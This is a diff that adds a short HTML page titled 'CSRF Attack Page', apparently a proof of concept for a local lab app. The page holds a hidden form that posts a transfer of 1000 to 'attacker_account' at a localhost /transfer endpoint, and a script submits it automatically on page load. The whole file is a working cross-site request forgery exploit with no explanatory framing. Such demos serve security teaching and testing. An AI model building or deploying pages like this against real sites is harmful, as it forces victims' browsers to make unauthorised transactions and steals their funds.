@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Page</title>
+</head>
+<body>
+    <h1>CSRF Attack</h1>
+    <form action="http://localhost:5002/transfer" method="POST" id="csrfForm">
+        <input type="hidden" name="amount" value="1000">
+        <input type="hidden" name="to_account" value="attacker_account">
+        <input type="submit" value="Submit CSRF Request">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
